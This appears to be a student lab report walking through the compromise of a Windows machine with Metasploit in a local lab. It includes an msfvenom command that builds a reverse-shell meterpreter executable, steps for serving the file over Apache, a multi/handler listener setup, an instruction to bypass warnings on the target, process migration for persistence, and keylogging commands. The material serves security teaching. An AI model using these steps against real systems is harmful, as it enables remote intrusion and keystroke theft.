# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="883" height="328" alt="image" src="https://github.com/user-attachments/assets/4e374b43-9b06-45e1-a353-1bcfb8732be8" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="880" height="125" alt="image" src="https://github.com/user-attachments/assets/093d3812-2c2a-42ce-8540-c586e17c3a69" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="880" height="125" alt="image" src="https://github.com/user-attachments/assets/ddc6490d-4fa5-4344-b50c-610a8fda59ea" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="812" height="52" alt="image" src="https://github.com/user-attachments/assets/007c965e-d499-4eae-a6ff-dcc733e243f2" />



Check the status of apache2
## OUTPUT:

<img width="941" height="400" alt="image" src="https://github.com/user-attachments/assets/598fb6fb-9b2c-4279-8703-83351dd24d56" />

Invoke msfconsole:
## OUTPUT:


<img width="913" height="540" alt="image" src="https://github.com/user-attachments/assets/3b0914ed-d60f-47b9-8332-ffb96a57ef7f" />


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:

<img width="925" height="971" alt="image" src="https://github.com/user-attachments/assets/01fe64e8-0be7-46c3-9384-682a05596784" />


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="716" height="702" alt="image" src="https://github.com/user-attachments/assets/82be4a8d-9fd0-429a-9802-cf331380a2d5" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:



Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:



On kali/parrot give the command exploit
## OUTPUT:

<img width="447" height="110" alt="image" src="https://github.com/user-attachments/assets/c3fdb931-d189-431e-9f16-2c75d34f5f3a" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:

<img width="466" height="120" alt="image" src="https://github.com/user-attachments/assets/be5f0d85-89cb-44ec-a17a-a26b7e8e2d36" />


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:
<img width="703" height="672" alt="image" src="https://github.com/user-attachments/assets/192ca3c7-f9d0-44e7-ad71-3eff1fc57aa3" />


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:





keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
